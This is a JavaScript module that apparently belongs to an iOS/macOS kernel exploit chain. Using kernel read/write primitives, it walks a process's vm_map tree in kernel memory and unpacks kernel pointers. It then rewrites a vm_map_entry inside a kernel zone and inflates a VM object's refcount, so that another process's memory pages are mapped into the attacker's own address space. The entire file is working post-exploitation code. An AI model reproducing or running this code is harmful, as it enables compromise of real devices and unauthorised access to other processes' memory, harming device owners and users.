import Chain from "libs/Chain/Chain";
import Native from "libs/Chain/Native";
import Utils from "libs/JSUtils/Utils";
import {vm_map_links, vm_map_entry} from "./VmMapEntry";
import Task from "./Task";
import VMObject from "./VMObject";
import VMShmem from "./VMShmem";
import VmPackingParams from "./VmPackingParams";

const TAG = "VM";
const VME_ALIAS_BITS = 12n;
const VME_OFFSET_BITS = (64n - VME_ALIAS_BITS);
const VME_OFFSET_SHIFT = VME_ALIAS_BITS;
const VME_SUBMAP_SHIFT = 2n;
const VME_SUBMAP_BITS = (8n * 8n - VME_SUBMAP_SHIFT);
const VM_KERNEL_POINTER_SIGNIFICANT_BITS = 38;
const VM_MAX_KERNEL_ADDRESS = 0xfffffffbffffffffn;
const VM_PAGE_PACKED_PTR_BITS = 31;
const VM_PAGE_PACKED_PTR_SHIFT = 6;
const SIZE_VMOBJECT = 0x20;
const VM_LINK_SIZE = 0x20;
const VM_MAP_ENTRY_SIZE = 0x50;
const VMShmem_SIZE = 0x18;
const VMPackingSize = 0x10;
const VM_FLAGS_ANYWHERE = 0x00000001n;

export default class VM
{
	static VM_PROT_READ = 1n;
	static VM_PROT_WRITE = 2n;
	static VM_PROT_EXECUTE = 4n;
	static VM_PROT_ALL = (this.VM_PROT_READ|this.VM_PROT_WRITE|this.VM_PROT_EXECUTE);
	static VM_PROT_IS_MASK = 0x40n;
	static VM_INHERIT_NONE = 2n;

	static #Tib(x)
	{
		return ((0n + (x)) << 40n);
	}
	static #Gib(x)
	{
		return ((0n + (x)) << 30n);
	}
	static #VM_MIN_KERNEL_ADDRESS()
	{
		return ((0n - this.#Gib(144n)));
	}
	static #VM_MIN_KERNEL_AND_KEXT_ADDRESS()
	{
		return this.#VM_MIN_KERNEL_ADDRESS();
	}
	static #VM_PAGE_PACKED_PTR_BASE()
	{
		return this.#VM_MIN_KERNEL_AND_KEXT_ADDRESS();
	}
	static #VM_PACKING_IS_BASE_RELATIVE(packed)
	{
		return ((packed.vmpp_bits + packed.vmpp_shift) <= VM_KERNEL_POINTER_SIGNIFICANT_BITS);
	}
	static #VM_PACKING_PARAMS(ns)
	{
		ns.vmpp_base_relative = this.#VM_PACKING_IS_BASE_RELATIVE(ns);
		return ns;
	}
	static #VM_UNPACK_POINTER(packed, ns)
	{
		return this.#vm_unpack_pointer(packed,this.#VM_PACKING_PARAMS(ns));
	}
	static #VM_PACK_POINTER(ptr, ns)
	{
		return this.#vm_pack_pointer(ptr, this.#VM_PACKING_PARAMS(ns));
	}
	static #bigUint64ToIntptr(bigUint64) {
		// Create a BigInt mask for the lower 64 bits
		const lower64BitsMask = BigInt("0xFFFFFFFFFFFFFFFF");

		// Apply the mask to ensure the value is within the range of 64 bits
		bigUint64 = bigUint64 & lower64BitsMask;

		// Check if the value is greater than the maximum signed 64-bit integer
		if (bigUint64 > BigInt("0x7FFFFFFFFFFFFFFF")) {
			// Convert to signed by subtracting 2^64
			return Number(bigUint64 - BigInt("0x10000000000000000"));
		} else {
			// Directly convert to Number
			return Number(bigUint64);
		}
	}
	static #vm_unpack_pointer(packed, params)
	{
		if (!params.vmpp_base_relative)
		{
			//console.log(TAG,`In first if unpack`);
			//let addr = this.#bigUint64ToIntptr(BigInt(packed));
			let addr = packed;
			addr <<= 64 - params.vmpp_bits;
			addr >>= 64 - params.vmpp_bits - params.vmpp_shift;
			return addr;
		}
		if (packed)
		{
			//console.log(TAG,`In second if unpack`);
			return (BigInt(packed) << BigInt(params.vmpp_shift)) + BigInt(params.vmpp_base);
		}
		return 0n;
	}
	static #vm_pack_pointer(ptr,params)
	{
		if (!params.vmpp_base_relative)
		{
			//console.log(TAG,`In first if pack`);
			return ptr >> params.vmpp_shift;
		}
		if (ptr)
		{
			//console.log(TAG,`In second if pack`);
			return (BigInt(ptr) - BigInt(params.vmpp_base)) >> BigInt(params.vmpp_shift);
		}
		return 0n;
	}
	static #VME_OFFSET(entry)
	{
		return entry.vme_offset << 12n;
	}
	static #trunc_page_kernel(x)
	{
		//return ((x) & (~vm_kernel_page_mask));
		return ((x) & (~Utils.PAGE_MASK));
	}
	static #round_page_kernel(x)
	{
		//return this.#trunc_page_kernel((x) + vm_kernel_page_mask);
		return this.#trunc_page_kernel((x) + Utils.PAGE_MASK);
	}
	static #vm_getEntry(map,address)
	{
		let rbhRoot = Chain.read64(map + Chain.offsets().hdrRBHRoot);
		
		//console.log(TAG,`Get entry:${Utils.hex(address)}`);
		//console.log(TAG,`rbh root:${Utils.hex(rbhRoot)}`);
	
		let rbEntry = rbhRoot;
		let foundEntry = 0n;
	
		while (rbEntry != 0n)
		{
			let curPtr = rbEntry - 0x20n; // container_of(rb_entry, struct vm_map_entry, store)
			//uint64_t prev = 0;
	
			let links = Native.mem;
			Chain.read(curPtr, links, VM_LINK_SIZE);
			let linksBuffer = Native.read(links,VM_LINK_SIZE);
			let linksArray = new Uint8Array(linksBuffer);
			links = new vm_map_links(linksArray);
	
			//console.log(TAG,`[${Utils.hex(links.start)} - ${Utils.hex(links.end)}]:${Utils.hex(curPtr)}`);
	
			if (address >= links.start)
			{
				if (address < links.end)
				{
					foundEntry = curPtr;
					//console.log(TAG,`Found:${Utils.hex(curPtr)}`);
					break;
				}
	
				let rbeRight = Chain.read64(rbEntry +  Chain.offsets().rbeRight);
				rbEntry = rbeRight;
				//prev = curPtr;
			}
			else
			{
				let rbeLeft = Chain.read64(rbEntry +  Chain.offsets().rbeLeft);
				rbEntry = rbeLeft;
			}
		}
		return foundEntry;
	}

	static mapRemotePage(vmMap, address)
	{
		//console.log(TAG, `Map remote address: ${Utils.hex(address)}`);

		let vmObject = VM.getObject(vmMap, address);
		//LOG("vmObject: %llx (objectOffset=%llx, entryOffset=%llx)",
		//	vmObject.address,
		//	vmObject.objectOffset,
		//	vmObject.entryOffset);
		
		if (!vmObject.address)
			return null;

		let shmem = VM.createShmemWithVmObject(vmObject);
		//LOG("shmem: port=%x, address=%llx", shmem.port, shmem.remoteAddress);

		return shmem;
	}

	static getObject(map, address)
	{
		let VMObjectBuff = new ArrayBuffer(SIZE_VMOBJECT);
		let vmObject = new VMObject(VMObjectBuff);
		let entryAddr = this.#vm_getEntry(map, address);
		if (!entryAddr)
			return vmObject;

		let entryBuff = Chain.readBuff(entryAddr, VM_MAP_ENTRY_SIZE);
		let entryUintArr = new Uint8Array(entryBuff);
		let entry = new vm_map_entry(entryUintArr);
		//console.log(TAG, `entry: addr=${Utils.hex(entryAddr)}, is_sub_map=${entry.is_sub_map}, vme_object_packed=${Utils.hex(entry.vme_object)}`);

		let paramsBuff = new ArrayBuffer(VMPackingSize);
		let params = new VmPackingParams(paramsBuff);
		params.vmpp_base = this.#VM_PAGE_PACKED_PTR_BASE();
		params.vmpp_bits = VM_PAGE_PACKED_PTR_BITS;
		params.vmpp_shift = VM_PAGE_PACKED_PTR_SHIFT;
		params.vmpp_base_relative = this.#VM_PACKING_IS_BASE_RELATIVE(params);
		let vmeObject = this.#VM_UNPACK_POINTER(entry.vme_object, params);
		//console.log(TAG, `vme object: ${Utils.hex(vmeObject)}`);

		let objectOffs = this.#VME_OFFSET(entry);
		let entryOffs = address - entry.links.start + objectOffs;
		
		//console.log(TAG, `object offset: ${Utils.hex(objectOffs)}`);
		//console.log(TAG, `entry offset: ${Utils.hex(entryOffs)}`);

		vmObject.vmAddress = address;
		vmObject.address = BigInt(vmeObject);
		vmObject.objectOffset = BigInt(objectOffs);
		vmObject.entryOffset = BigInt(entryOffs);
		return vmObject;
	}

	static createShmemWithVmObject(object)
	{
		//console.log(TAG,`Inside createShmem with addr to read:${Utils.hex(object.address)}`);
		let shmemBuff = new ArrayBuffer(VMShmem_SIZE);
		let shmem = new VMShmem(shmemBuff);
		let size = Chain.read64(object.address + Chain.offsets().vouSize);
		size = Task.round_page(size);
		
		//console.log(TAG,`vm object size:${Utils.hex(size)}`);
		
		let localAddr = Native.mem;
		let roundedSize = this.#round_page_kernel(size);
		let ret = Native.callSymbol("mach_vm_allocate",0x203n, localAddr, roundedSize, VM_FLAGS_ANYWHERE);
		if (ret != 0)
		{
			console.log(TAG,`mach_vm_allocate():${ret}`);
			return shmem;
		}
		localAddr = Native.read64(localAddr);
		//console.log(TAG,`mach_vm_allocate:${Utils.hex(roundedSize)} localAddr:${Utils.hex(localAddr)}`);
		/*
		let memory_object = new_bigint();
		ret = Native.callSymbol("mach_make_memory_entry_64",
			0x203n,
			get_bigint_addr(roundedSize),
			localAddr,
			this.VM_PROT_READ | this.VM_PROT_WRITE,
			get_bigint_addr(memory_object),
			0n);
		let resBuff = Native.read(get_bigint_addr(memory_object),Utils.UINT32_SIZE);
		let resView = new DataView(resBuff);
		let port = resView.getUint32(0,true);
		*/
		
		let memory_object = Native.mem + 0x500n;
		let roundedSizePtr = Native.mem + 0x1000n;
		Native.write64(roundedSizePtr, roundedSize);

		ret = Native.callSymbol("mach_make_memory_entry_64",
			0x203n,
			roundedSizePtr,
			localAddr,
			this.VM_PROT_READ | this.VM_PROT_WRITE,
			memory_object,
			0n);
		let port = Native.read32(memory_object);
		//let port = Native.callSymbol("wrapper_mach_make_memory_entry_64",roundedSize,localAddr);
		//console.log(TAG,`mach_make_memory_entry_64():${Utils.hex(port)}`);
		let shmemNamedEntry = Task.getPortKObject(BigInt(port));
		//console.log(TAG,`shmem named entry:${Utils.hex(shmemNamedEntry)}`);
		let shmemVMCopyAddr = Chain.read64(shmemNamedEntry + Chain.offsets().backingCopy);
		//console.log(TAG,`shmem named entry VM copy addr:${Utils.hex(shmemVMCopyAddr)}`);
		let nextAddr = Chain.read64(shmemVMCopyAddr + Chain.offsets().next);
		//console.log(TAG,`next addr:${Utils.hex(nextAddr)}`);
		let entryBuff = Chain.readBuff(nextAddr, VM_MAP_ENTRY_SIZE);
		let entryArr = new Uint8Array(entryBuff);
		let entry = new vm_map_entry(entryArr);
		//console.log(TAG,`entry: vme_kernel_object=${Utils.hex(entry.vme_kernel_object)}, is_sub_map=${Utils.hex(entry.is_sub_map)}`);
		//console.log(TAG,`entry: is_sub_map=${Utils.hex(entry.is_sub_map)}`);
		if (entry.vme_kernel_object || entry.is_sub_map || false) // vme_kernel_object struct is not implemented
		{
			console.log(TAG,`Entry cannot be a submap`);
			return shmem;
		}
		let paramsBuff = new ArrayBuffer(VMPackingSize);
		let params = new VmPackingParams(paramsBuff);
		params.vmpp_base = this.#VM_PAGE_PACKED_PTR_BASE();
		params.vmpp_bits = VM_PAGE_PACKED_PTR_BITS;
		params.vmpp_shift = VM_PAGE_PACKED_PTR_SHIFT;
		params.vmpp_base_relative = this.#VM_PACKING_IS_BASE_RELATIVE(params);
		let packedPointer = this.#VM_PACK_POINTER(object.address, params);
		//console.log(TAG,`packedPointer:${Utils.hex(packedPointer)}`);
		let refCount = Chain.read32(object.address + Chain.offsets().refCount);
		//console.log(TAG,`vm object ref count:${Utils.hex(refCount)}`);
		refCount++;
		Chain.write32(object.address + Chain.offsets().refCount, refCount);
		entry.vme_object = Number(packedPointer);
		entry.vme_offset = object.objectOffset;
		//write(nextAddr, &entry, sizeof(entry));
		// write dedicate write in order to avoid zone panic with bigger 0x20 elements size
		let entryResWrite = Native.mem;
		Native.write(entryResWrite,entryArr.buffer);
		//Utils.printArrayBufferInChunks(entryArr.buffer);
		Chain.writeZoneElement(nextAddr, entryResWrite, VM_MAP_ENTRY_SIZE);
		//console.log(TAG,`After write zone element`);
		//let mappedAddr = Native.callSymbol("malloc",roundedSize * 4n);
		//let mappedAddr = new_bigint();
		let mappedAddr = Native.mem;
		Native.write64(mappedAddr, 0x1337n);
		//let mach_vm_map_func = Native.dlsym("mach_vm_map");
		//console.log(TAG,`mach_vm_map:${Utils.hex(mach_vm_map_func)} with object.entryOffset:${Utils.hex(object.entryOffset)}`);
		//ret = fcall(mach_vm_map_func,0x203n,get_bigint_addr(mappedAddr),0x4000n,0n,1n,BigInt(port),BigInt(object.entryOffset),0n,(this.VM_PROT_ALL | this.VM_PROT_IS_MASK) | ((this.VM_PROT_ALL | this.VM_PROT_IS_MASK) << 32n),this.VM_INHERIT_NONE);
		ret = Native.callSymbol("mach_vm_map",0x203n,mappedAddr,0x4000n,0n,1n,BigInt(port),BigInt(object.entryOffset),0n,(this.VM_PROT_ALL | this.VM_PROT_IS_MASK) | ((this.VM_PROT_ALL | this.VM_PROT_IS_MASK) << 32n),this.VM_INHERIT_NONE);
		//console.log(TAG,`ret:${ret}`);
		mappedAddr = Native.read64(mappedAddr);
		//console.log(TAG,`mach_vm_map():${Utils.hex(ret)}, mappedAddr=${Utils.hex(mappedAddr)}`);
		if(ret != 0)
		{
			console.log(TAG,'failed on mach_vm_map');
			mappedAddr = 0n;
		}

		ret = Native.callSymbol("mach_vm_deallocate", 0x203, localAddr, roundedSize);
		if (ret != 0) {
			console.log(TAG, "mach_vm_deallocate: " + ret);
		}

		//let mappedAddr = Native.callSymbol("wrapper_mach_vm_map",port,object.entryOffset);
		//console.log(TAG,`mappedAddr:${Utils.hex(mappedAddr)}`);
		shmem.port = BigInt(port);
		shmem.remoteAddress = object.vmAddress;
		shmem.localAddress = mappedAddr;
		return shmem;
	}
	
	static mocker(addrUnpack,addrPack)
	{
		let paramsBuff = new ArrayBuffer(VMPackingSize);
		let params = new VmPackingParams(paramsBuff);
		params.vmpp_base = this.#VM_PAGE_PACKED_PTR_BASE();
		params.vmpp_bits = VM_PAGE_PACKED_PTR_BITS;
		params.vmpp_shift = VM_PAGE_PACKED_PTR_SHIFT;
		params.vmpp_base_relative = this.#VM_PACKING_IS_BASE_RELATIVE(params);
		let vmeObject = this.#VM_UNPACK_POINTER(addrUnpack, params);
		//console.log(TAG,`vmeObjectUnpack:${Utils.hex(vmeObject)}`);
		vmeObject = this.#VM_PACK_POINTER(addrPack,params);
		//console.log(TAG,`vmeObjectpack:${Utils.hex(vmeObject)}`);
	}
}
